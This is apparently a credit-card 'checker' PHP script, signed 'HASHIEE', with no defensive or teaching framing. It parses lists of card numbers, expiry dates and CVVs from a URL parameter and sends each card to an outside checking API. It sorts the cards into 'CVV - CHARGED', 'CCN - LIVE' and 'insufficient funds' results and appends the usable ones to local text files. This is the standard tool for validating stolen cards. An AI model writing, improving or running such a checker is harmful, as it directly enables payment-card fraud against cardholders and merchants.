<?php
///////////////////////////////////////////////

    ///// HI, I'M HASHIEE!(⁠≧⁠▽⁠≦)/////////

///////////////////////////////////////////////

error_reporting(0);
date_default_timezone_set('Asia/Manila');

$time_start = microtime(true);

// Get the credit card details from the request
$list  = $_GET['lista'];
$cc_in = preg_replace('/[^0-9|]+/', '|', $list);
$lista = trim($cc_in);
$lista = str_replace("-","",$lista);
$lista = preg_replace('/\s+/', '|', $lista);
$raw   = explode("|", $lista);
$cc    = $raw[0];
$mes   = $raw[1];
$mes   = strlen($mes) == 1 ? '0'.$mes : $mes;
$ano   = $raw[2];
$ano   = strlen($ano) == 2 ? '20'.$ano : $ano;
$cvv   = $raw[3];

// Format the credit card for the API
$formatted_cc = $cc .  '|' . $mes . '|' . $ano . '|' .  $cvv;

// Call the new API
$api_url = "https://chkr-api.vercel.app/api/check?cc=" . urlencode($formatted_cc);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept: application/json, text/plain, */*',
    'Accept-Language: en-US,en;q=0.9'
));

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Calculate time
$timis = (microtime(true) - $time_start);
$timis = (round($timis, 0));
$timee = date("h: i:s");

// Parse the response
$result = json_decode($response, true);

// Function to write results to file
function write($key, $what){
    fwrite(fopen($key.'.txt', 'a'), $what."\n");
}

// Process the response and display results
if ($http_code == 200 && $result) {
    $status = isset($result['status']) ? strtolower($result['status']) : '';
    $message = isset($result['message']) ? $result['message'] : 'Unknown response';
    $code = isset($result['code']) ? $result['code'] : '';
    
    // Check for different response types based on status/message
    if (strpos($status, 'approved') !== false || strpos($message, 'approved') !== false || 
        strpos($message, 'success') !== false || strpos($message, 'charged') !== false) {
        // CVV Match / Approved
        echo '<font class="text-white">'.$list.'</font><br><font class="text-primary">[#CVV] ['.$message.' » '.$code.'] [T:'.$timis.'s-'.$timee.']</font>';
        write('cvv', $list." [ CVV - CHARGED ]");
    }
    elseif (strpos($message, 'avs_and_cvv') !== false || strpos($message, 'Gateway Rejected: avs_and_cvv') !== false) {
        // AVS and CVV mismatch
        echo '<font class="text-white">'.$list.'</font><br><font class="text-warning">[#CCN] ['.$message. '] [T:'.$timis.'s-'.$timee.']</font>';
        write('ccn-avs', $list." [ CCN - AVS_AND_CVV ]");
    }
    elseif (strpos($message, 'avs') !== false && strpos($message, 'cvv') === false) {
        // AVS mismatch only
        echo '<font class="text-white">'.$list.'</font><br><font class="text-primary">[#CVV] ['.$message.'] [T:'.$timis.'s-'.$timee.']</font>';
        write('cvv', $list." [ CVV - AVS ]");
    }
    elseif (strpos($message, 'Card Issuer Declined CVV') !== false || 
            strpos($message, 'card verification number does not match') !== false ||
            strpos($message, 'cvv') !== false) {
        // CCN - CVV mismatch
        echo '<font class="text-white">'.$list.'</font><br><font class="text-warning">[#CCN] ['.$message.'] [T:'.$timis.'s-'.$timee.']</font>';
        write('ccn', $list." [ CCN - CVV_MISMATCH ]");
    }
    elseif (strpos($message, 'Insufficient Funds') !== false || 
            strpos($message, 'insufficient funds') !== false) {
        // Insufficient funds
        echo '<font class="text-white">'.$list.'</font><br><font class="text-warning">[#CCN] ['.$message.'] [T:'.$timis.'s-'.$timee.']</font>';
        write('ccn', $list." [ CCN - INSUFFICIENT_FUNDS ]");
    }
    elseif (strpos($status, 'live') !== false || strpos($message, 'live') !== false) {
        // Card is live but declined
        echo '<font class="text-white">'.$list.'</font><br><font class="text-warning">[#CCN] ['.$message.'] [T:'.$timis.'s-'.$timee.']</font>';
        write('ccn', $list." [ CCN - LIVE ]");
    }
    else {
        // Dead or declined
        echo '<font class="text-white">'.$list.'</font><br><font class="text-danger">['.$message.'] [T:'.$timis.'s-'.$timee.']</font>';
    }
} else {
    // API error or no response
    $error_message = "API Error";
    if ($http_code != 200) {
        $error_message = "HTTP Error: " . $http_code;
    } elseif (empty($response)) {
        $error_message = "Empty Response";
    } else {
        $error_message = "Invalid Response Format";
    }
    
    echo '<font class="text-white">'.$list.'</font><br><font class="text-danger">['.$error_message.'] [T:'.$timis.'s-'.$timee.']</font>';
}

exit;
?>
